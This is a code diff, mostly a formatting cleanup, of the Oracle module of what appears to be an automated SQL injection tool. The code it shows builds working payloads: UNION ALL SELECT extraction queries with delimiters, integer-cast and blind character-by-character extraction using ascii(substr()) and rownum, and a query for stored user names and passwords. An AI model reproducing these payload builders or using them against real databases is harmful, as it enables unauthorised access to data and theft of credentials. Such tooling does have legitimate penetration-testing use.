@@ -23,7 +23,6 @@
 # Gastón Traberg
 
 from . import DbmsMole, FingerBase
-import re
 
 class OracleMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -63,10 +62,10 @@ class OracleMole(DbmsMole):
 
     def _dbinfo_query_info(self):
         return {
-            'field' : ['user','banner','ora_database_name'],
+            'field' : ['user', 'banner', 'ora_database_name'],
             'table' : 'v$version'
         }
-    
+
     def _user_creds_query_info(self):
         return {
             'field'  : ['name', 'password'],
@@ -87,7 +86,6 @@ class OracleMole(DbmsMole):
         integer_output = []
         for i in range(query_columns):
             hashes = list(map(lambda x: 'null', range(query_columns)))
-            integer_hashes = []
             to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
             to_search[i] = str(base + i)
             hashes[i] = '(cast (' + str(base + i) + ' as varchar2(150)))'
@@ -125,7 +123,7 @@ class OracleMole(DbmsMole):
             return OracleMole.integer_field_finger_result
 
 
-    def forge_count_query(self, fields, table_name, injectable_field, where = "1=1"):
+    def forge_count_query(self, fields, table_name, injectable_field, where="1=1"):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
@@ -133,13 +131,13 @@ class OracleMole(DbmsMole):
         query += ' from ' + table_name + ' where ' + self.parse_condition(where)
         return query
 
-    def forge_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, fields, table_name, injectable_field, where="1=1", offset=0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("(" +
                                             OracleMole.out_delimiter +
                                             "||(" +
-                                                ('||'+OracleMole.inner_delimiter+'||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
+                                                ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
                                             ")||" +
                                             OracleMole.out_delimiter +
                                         ")")
@@ -148,7 +146,7 @@ class OracleMole(DbmsMole):
         query += " where r = " + str(offset + 1)
         return query
 
-    def forge_integer_count_query(self, fields, table_name, injectable_field, where = "1=1"):
+    def forge_integer_count_query(self, fields, table_name, injectable_field, where="1=1"):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ('cast(cast(' + OracleMole.integer_out_delimiter +
@@ -158,13 +156,13 @@ class OracleMole(DbmsMole):
         query += ' from ' + table_name + ' where ' + self.parse_condition(where)
         return query
 
-    def forge_integer_len_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_integer_len_query(self, fields, table_name, injectable_field, where="1=1", offset=0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast (cast(" +
                                             OracleMole.integer_out_delimiter +
                                             " as varchar(10))||cast(length(" +
-                                                ('||'+OracleMole.inner_delimiter+'||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
+                                                ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
                                             ") as varchar(30))||cast(" +
                                             OracleMole.integer_out_delimiter +
                                         " as varchar(10)) as number(19))")
@@ -173,13 +171,13 @@ class OracleMole(DbmsMole):
         query += " where r = " + str(offset + 1)
         return query
 
-    def forge_integer_query(self, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_integer_query(self, index, fields, table_name, injectable_field, where="1=1", offset=0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" +
                                             OracleMole.integer_out_delimiter +
                                             " as varchar(10))||cast(ascii(substr(" +
-                                                ('||'+OracleMole.inner_delimiter+'||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
+                                                ('||' + OracleMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(cast(' + x + ' as varchar2(100)), chr(32))', fields)) +
                                             "," + str(index) + ", 1)) as varchar(50))||cast(" +
                                             OracleMole.integer_out_delimiter +
                                         " as varchar(10)) as number(19))")
@@ -211,10 +209,10 @@ class OracleMole(DbmsMole):
         return self.finger.is_string_query
 
     def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
-        return ' and {op_par}' + str(value) + ' < (select ascii(substr('+self._do_concat_fields(fields)+', '+str(index)+', 1)) from (select rownum r,'+','.join(fields)+' from '+table+' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
+        return ' and {op_par}' + str(value) + ' < (select ascii(substr(' + self._do_concat_fields(fields) + ', ' + str(index) + ', 1)) from (select rownum r,' + ','.join(fields) + ' from ' + table + ' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
 
     def forge_blind_count_query(self, operator, value, table, where="1=1"):
-        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  from '+table+' where '+self.parse_condition(where)+')'
+        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  from ' + table + ' where ' + self.parse_condition(where) + ')'
 
     def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
-        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+self._do_concat_fields(fields)+') from (select rownum r,'+','.join(fields)+' from '+table+' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
+        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length(' + self._do_concat_fields(fields) + ') from (select rownum r,' + ','.join(fields) + ' from ' + table + ' where ' + self.parse_condition(where) + ') where r = ' + str(offset + 1) + ')'
